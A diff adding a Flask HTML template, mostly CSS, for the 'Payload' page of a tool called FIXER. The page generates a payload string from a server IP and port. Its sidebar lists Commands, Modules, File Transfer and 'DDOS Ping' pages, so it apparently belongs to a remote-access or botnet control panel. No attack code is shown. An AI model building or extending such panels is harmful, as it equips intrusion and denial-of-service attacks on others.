@@ -1,0 +1,219 @@
+<!-- Payload.html -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>FIXER - Payload</title>
+    <style>
+        .sidebar {
+            height: 100%;
+            width: 220px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: #4caf50;
+            overflow-x: hidden;
+            padding-top: 10px;
+            text-align: left;
+        }
+        .sidebar a {
+            padding: 3px;
+            text-decoration: none;
+            font-size: 22px;
+            color: white;
+            display: flex;
+            align-items: center;
+            vertical-align: middle;
+        }
+        .sidebar img.avatar {
+            width: 25px;
+            align-items: center;
+            margin-bottom: 10px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        .sidebar img.logo {
+            margin-left: 35px;
+            width: 150px;
+            margin-bottom: 10px;
+        }
+        .sidebar a.selected {
+            background-color: #3a893e;
+        }
+        .sidebar a.logout {
+            background-color: #317334;
+        }
+        .sidebar a:hover {
+            background-color: #409744;
+        }
+        .content {
+            margin-left: 240px;
+            padding: 5px;
+            padding-top: 10px;
+            margin-top: 5px;
+        }
+        img {
+            display: block;
+        }
+        body {
+            font-family: 'Impact', sans-serif;
+            font-weight: 300;
+            line-height: 1.42em;
+            color: #A7A1AE;
+            background-color: #1F2739;
+        }
+        #just-line-break {
+            white-space: pre-line;
+        }
+        #line-break-and-tab {
+            white-space: pre-wrap;
+        }
+        h1 {
+            font-size: 2em;
+            margin-left: 170px;
+            font-weight: 300;
+            line-height: 1em;
+            text-align: center;
+            color: #4DC3FA;
+        }
+        .blue {
+            color: #185875;
+        }
+        .yellow {
+            color: #FFF842;
+        }
+        .content {
+            margin: auto;
+            width: 98%;
+            padding: 10px;
+        }
+        .sendcommands {
+            display: flex;
+            font-family: 'Impact', sans-serif;
+            font-size: 28px;
+            margin-left: 210px;
+            margin-right: 5px;
+            flex-direction: row;
+            align-items: center;
+        }
+        .sendcommands label {
+            margin-bottom: 10px;
+            margin-top: 10px;
+            color: #ffffff;
+            margin-left: 5px;
+            margin-right: 5px;
+            display: flex;
+            align-items: center;
+        }
+        .sendcommands input[type="text"],
+        .sendcommands input[type="number"] {
+            width: 250px;
+            padding: 5px;
+            font-size: 15px;
+            margin-left: 5px;
+            margin-right: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            vertical-align: middle;
+        }
+        .sendcommands input[type="checkbox"]{
+            transform: scale(2);
+            margin-left: 10px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        .sendcommands button {
+            padding: 10px 20px;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            margin-left: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 200px;
+            vertical-align: middle;
+        }
+        .sendcommands button:hover {
+            background-color: #45a049;
+        }
+        @media (max-width: 800px) {
+            .container td:nth-child(4),
+            .container th:nth-child(4) {
+                display: none;
+            }
+        }
+        #payloadString {
+            margin-top: 20px;
+            margin-left: 215px;
+            border: 1px solid #ccc;
+            font-size: 18px;
+            text-align: center;
+            padding: 10px;
+            border-radius: 5px;
+            width: 83.7%;
+            word-wrap: break-word;
+        }
+        #copybutton button {
+            padding: 10px 20px;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin-top: 10px;
+            margin-left: 775px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 150px;
+            vertical-align: middle;
+        }
+        #copybutton button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <img src="{{ url_for('static', filename='Lion.png') }}" alt="Logo" class="logo">
+        <a href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
+        <a href="{{ url_for('payload') }}" class="selected"><img src="{{ url_for('static', filename='payload_icon.png') }}" alt="Payload Icon" class="avatar"> Payload</a>
+        <a href="{{ url_for('modules') }}"><img src="{{ url_for('static', filename='modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
+        <a href="{{ url_for('commands') }}"><img src="{{ url_for('static', filename='commands_icon.png') }}" alt="Commands Icon" class="avatar"> Commands</a>
+        <a href="{{ url_for('ping') }}"><img src="{{ url_for('static', filename='danger_icon.png') }}" alt="DDOS Ping Icon" class="avatar"> DDOS Ping</a>
+        <a href="{{ url_for('file_transfer') }}" class="selected"><img src="{{ url_for('static', filename='file_transfer_icon.png') }}" alt="File Transfer Icon" class="avatar"> File Transfer</a>
+        <a href="{{ url_for('logout') }}" class="logout"><img src="{{ url_for('static', filename='logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
+    </div>
+    <div class="content">
+        <form id="commandForm" method="get" name="commandForm">
+            <div class="sendcommands">
+                <label for="serverIP">SERVER-IP:</label>
+                <input type="text" id="serverIP" name="serverIP" required>
+                <label for="port">SERVER-PORT:</label>
+                <input type="number" id="port" name="port" required>
+                <label for="forceConvert">FORCE EXECUTABLE:</label>
+                <input type="checkbox" id="forceConvert" name="forceConvert">
+                <button type="submit">GENERATE PAYLOAD</button>
+            </div>
+        </form>
+        <div>
+            <h1>PAYLOAD</h1>
+            <div id="payloadString">{{string}}</div>
+            <div id="copybutton"><button onclick="copyPayload()">COPY</button></div>
+        </div>
+    </div>
+    <script>
+        function copyPayload() {
+            const payloadString = document.getElementById('payloadString');
+            const range = document.createRange();
+            range.selectNode(payloadString);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            window.getSelection().removeAllRanges();
+            alert('Payload string copied!');
+        }
+    </script>
+</body>
+</html>
